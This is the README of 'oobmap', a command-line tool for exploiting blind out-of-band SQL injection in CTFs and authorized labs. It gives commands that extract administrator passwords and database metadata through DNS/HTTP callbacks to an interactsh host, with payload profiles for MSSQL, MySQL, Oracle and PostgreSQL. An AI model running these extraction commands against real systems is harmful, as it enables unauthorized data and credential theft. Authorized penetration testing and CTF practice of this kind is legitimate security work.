# oobmap

`oobmap` is a command-line tool for exploiting **blind out-of-band injection**
in CTFs and authorized labs.

It uses an OAST service such as **interactsh** as the signal source. Instead of
checking whether a page contains a word like `Welcome back`, `oobmap` watches for
DNS/HTTP callbacks and uses those callbacks to recover data.

Typical use cases:

- blind SQL injection where the database can trigger DNS or HTTP requests;
- MSSQL `xp_dirtree` / UNC-based DNS callbacks;
- Oracle `UTL_HTTP` callbacks;
- PostgreSQL `COPY TO PROGRAM` callbacks when privileges allow it;
- MySQL `LOAD_FILE()` UNC callbacks on suitable Windows targets.

`oobmap` is not a full sqlmap replacement. It is a focused OOB extractor for
cases where the useful signal happens outside the HTTP response.

## Requirements

- Python 3.10+
- `interactsh-client`
- Permission to test the target

Install `interactsh-client` with Go:

```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
export PATH="$PATH:$HOME/go/bin"
```

## Installation

Clone the repository:

```bash
git clone https://github.com/<you>/oobmap.git
cd oobmap
```

Run directly:

```bash
python3 oobmap.py --help
```

Or create a shell alias:

```bash
alias oobmap='python3 /absolute/path/to/oobmap/oobmap.py'
```

The project currently uses only the Python standard library, so there are no
Python dependencies to install.

## Quick Start

Start interactsh and save JSONL events:

```bash
interactsh-client -json -o interactsh.jsonl
```

Copy the payload domain that interactsh prints:

```text
abc123.oast.site
```

Capture a request in Burp Suite or ZAP and save it as `req.txt`.

Example request:

```http
GET / HTTP/1.1
Host: target.example
Cookie: TrackingId=abc123; session=xyz
User-Agent: Mozilla/5.0
Accept: */*
Connection: close
```

First, verify that conditional OOB callbacks work:

```bash
oobmap check \
  -r req.txt \
  --dbms mssql \
  --domain abc123.oast.site \
  --log interactsh.jsonl \
  --level 2 \
  --first
```

Without `-p`, `check` scans injection points according to `--level`.
At `--level 2`, it tests query parameters, form body parameters, and cookies.
When a point is confirmed, `oobmap` prints the exact `--place ... -p ...` pair
to reuse for extraction.

If the check succeeds, extract a scalar expression:

```bash
oobmap extract \
  -r req.txt \
  -p TrackingId \
  --dbms mssql \
  --domain abc123.oast.site \
  --log interactsh.jsonl \
  --expr "SELECT password FROM users WHERE username='administrator'"
```

For hex-like secrets, restrict the alphabet to make extraction faster:

```bash
oobmap extract \
  -r req.txt \
  -p TrackingId \
  --dbms mssql \
  --domain abc123.oast.site \
  --log interactsh.jsonl \
  --expr "SELECT password FROM users WHERE username='administrator'" \
  --alphabet 0123456789abcdef \
  --max-len 40
```

## Commands

List payload profiles:

```bash
oobmap profiles
```

Check whether the target gives conditional callbacks. This can target one known
parameter:

```bash
oobmap check -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl
```

Or scan several locations:

```bash
oobmap check -r req.txt --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --level 3 --first
```

Extract an arbitrary scalar SQL expression:

```bash
oobmap extract -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --expr "SELECT DB_NAME()"
```

Extract common metadata:

```bash
oobmap enum -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  --banner --current-user --current-db
```

Use table/column syntax:

```bash
oobmap dump -r req.txt -p TrackingId --dbms mssql \
  --domain abc123.oast.site --log interactsh.jsonl \
  -T users -C password --where "username='administrator'"
```

## Injection Points

By default, `oobmap` searches for `-p <name>` in cookies, query string, form
body, and headers.

For automatic checks, `--level` controls where it looks:

| Level | Locations |
|---|---|
| `1` | Query string and URL-encoded form body |
| `2` | Level 1 + cookies |
| `3` | Level 2 + common headers such as `User-Agent`, `Referer`, `X-Forwarded-For` |
| `5` | Level 3 + most remaining headers |

`--risk` is accepted for sqlmap-like workflows, but payload choice is currently
driven by the selected OOB profile. Future versions will use `--risk` to choose
between safer and more aggressive payload variants.

Force a location:

```bash
--place cookie
--place query
--place body
--place header
```

You can also mark the exact injection point with `*`:

```http
GET /search?q=test* HTTP/1.1
Host: target.example
```

Then run:

```bash
oobmap extract -r req.txt -p ignored --place marker ...
```

For HTTPS targets saved as raw HTTP requests, add:

```bash
--force-ssl
```

## Payload Profiles

Current profiles:

| Profile | Purpose | Notes |
|---|---|---|
| `mssql` | MSSQL stacked query via `xp_dirtree` | Requires stacked queries and access to `xp_dirtree`. |
| `mysql` | MySQL `LOAD_FILE('\\\\host\\x')` | Usually depends on Windows/UNC behavior and file privileges. |
| `oracle-http` | Oracle `UTL_HTTP.REQUEST()` | Requires network ACL/package access. |
| `postgres-program` | PostgreSQL `COPY ... TO PROGRAM` | Requires high privileges such as superuser or `pg_execute_server_program`. |
| `sqlite-lab` | Training profile using a custom `dns_lookup()` SQL function | For local demos only. |

Profiles are explicit on purpose. OOB exploitation depends heavily on the DBMS,
available privileges, network egress, and stacked-query support.

## How Extraction Works

For every character position, `oobmap` sends the whole alphabet in a batch.
Each candidate gets a unique callback token:

```text
<run-id>-p01-c73.abc123.oast.site
```

If interactsh receives that callback, `oobmap` decodes:

```text
p01 = position 1
c73 = ASCII hex 0x73 = s
```

Then it appends `s` to the result and moves to the next position.

This avoids the slow pattern of waiting after every single character.

## Example Workflow

1. Capture a request as `req.txt`.
2. Start interactsh:

   ```bash
   interactsh-client -json -o interactsh.jsonl
   ```

3. Confirm OOB:

   ```bash
   oobmap check -r req.txt --dbms mssql \
     --domain abc123.oast.site --log interactsh.jsonl \
     --level 2 --first
   ```

4. Reuse the confirmed injection point:

   ```bash
   oobmap extract -r req.txt --place cookie -p TrackingId --dbms mssql \
     --domain abc123.oast.site --log interactsh.jsonl \
     --expr "SELECT password FROM users WHERE username='administrator'"
   ```

5. Watch progress:

   ```text
   [+] pos 01: s -> s
   [+] pos 02: q -> sq
   [+] pos 03: l -> sql
   ```

## Limitations

`oobmap` needs a real OOB primitive. If the database cannot trigger DNS/HTTP
requests, use boolean/time/error-based extraction instead.

Common blockers:

- outbound DNS/HTTP is blocked;
- stacked queries are not supported;
- the DBMS function is disabled;
- the database user lacks privileges;
- DNS caching delays callbacks;
- the chosen alphabet does not contain the secret character.

When in doubt, start with `oobmap check`.

## Current Scope

The goal is to behave like a sqlmap-style workflow for OOB exploitation, but
`oobmap` is not yet a full SQL injection framework.

Implemented:

- OOB check against a known injection point;
- OOB scan of likely injection points with `--level`;
- scalar extraction with `extract`;
- `dump` helper for one table/column expression;
- metadata extraction with `enum --banner --current-user --current-db`;
- `--force-ssl`, `--batch`, `--risk`, and `--verbose` style options.

Not implemented yet:

- full `--dbs`, `--tables`, and `--columns` enumeration;
- WAF bypass/tamper scripts;
- DBMS fingerprinting;
- boolean/time/error/UNION exploitation;
- session resume and persistent run cache.

## Safety

Use this only on systems you own, CTF infrastructure, training labs, or targets
where you have explicit permission. OOB payloads can generate external network
traffic from the target.

## Development

Run tests:

```bash
PYTHONPATH=. python3 -m unittest discover -s tests -v
```

Run syntax checks:

```bash
python3 -m py_compile oobmap.py oobmap/*.py
```
